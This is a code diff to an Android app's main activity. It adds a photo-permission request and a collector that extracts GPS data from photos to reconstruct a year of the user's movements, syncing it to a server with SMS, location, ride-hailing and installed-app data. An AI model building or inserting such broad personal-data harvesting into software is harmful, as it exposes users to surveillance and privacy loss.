@@ -23,8 +23,8 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 100;
 
-    // 6 collection steps + 8 sync steps = 14 total
-    private static final int COLLECT_STEPS = 6;
+    // 7 collection steps + 9 sync steps = 16 total
+    private static final int COLLECT_STEPS = 7;
     private static final int TOTAL_STEPS   = COLLECT_STEPS + DataSyncManager.SYNC_TABLE_COUNT;
 
     private TextView    statusText;
@@ -34,8 +34,10 @@ public class MainActivity extends AppCompatActivity {
     private int         currentPermIndex = 0;
     private boolean[]   permRequestedOnce;
 
-    // Each permission with its title and explanation shown to the user
-    private static final String[][] PERM_INFO = {
+    private String[][] PERM_INFO;
+
+    // Base permissions (always requested)
+    private static final String[][] BASE_PERMS = {
         {
             Manifest.permission.READ_SMS,
             "SMS Messages",
@@ -63,6 +65,17 @@ public class MainActivity extends AppCompatActivity {
         },
     };
 
+    private String[] photoPermEntry() {
+        String perm = (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
+            ? Manifest.permission.READ_MEDIA_IMAGES
+            : Manifest.permission.READ_EXTERNAL_STORAGE;
+        return new String[] {
+            perm,
+            "Photo Library (Location History)",
+            "This app needs access to your photos to extract GPS location data embedded in each photo.\n\nPurpose: Reconstruct your movement history over the past year from photo EXIF data — where you stayed, how often, and for how long."
+        };
+    }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -81,9 +94,14 @@ public class MainActivity extends AppCompatActivity {
         progressBar     = findViewById(R.id.progressBar);
         stepsCompleted  = 0;
         currentPermIndex = 0;
-        permRequestedOnce = new boolean[PERM_INFO.length];
 
         updateProgress(0, "Preparing...");
+
+        // Build permission list: base + photo permission (version-specific)
+        PERM_INFO = new String[BASE_PERMS.length + 1][];
+        System.arraycopy(BASE_PERMS, 0, PERM_INFO, 0, BASE_PERMS.length);
+        PERM_INFO[BASE_PERMS.length] = photoPermEntry();
+        permRequestedOnce = new boolean[PERM_INFO.length];
 
         // Start one-by-one permission requests
         requestNextPermission();
@@ -243,9 +261,12 @@ public class MainActivity extends AppCompatActivity {
             updateProgress(++stepsCompleted, "Collecting installed apps...");
 
             new InstalledAppsCollector(this).collect();
+            updateProgress(++stepsCompleted, "Scanning photo locations...");
+
+            new PhotoLocationCollector(this).collect();
             updateProgress(++stepsCompleted, "Syncing to server...");
 
-            // --- Sync phase (8 steps) ---
+            // --- Sync phase (9 steps) ---
             String[] tableLabels = {
                 "Syncing SMS...",
                 "Syncing location...",
@@ -255,6 +276,7 @@ public class MainActivity extends AppCompatActivity {
                 "Syncing ride-hailing...",
                 "Syncing device info...",
                 "Syncing installed apps...",
+                "Syncing photo locations...",
             };
 
             new DataSyncManager(this).syncAll(
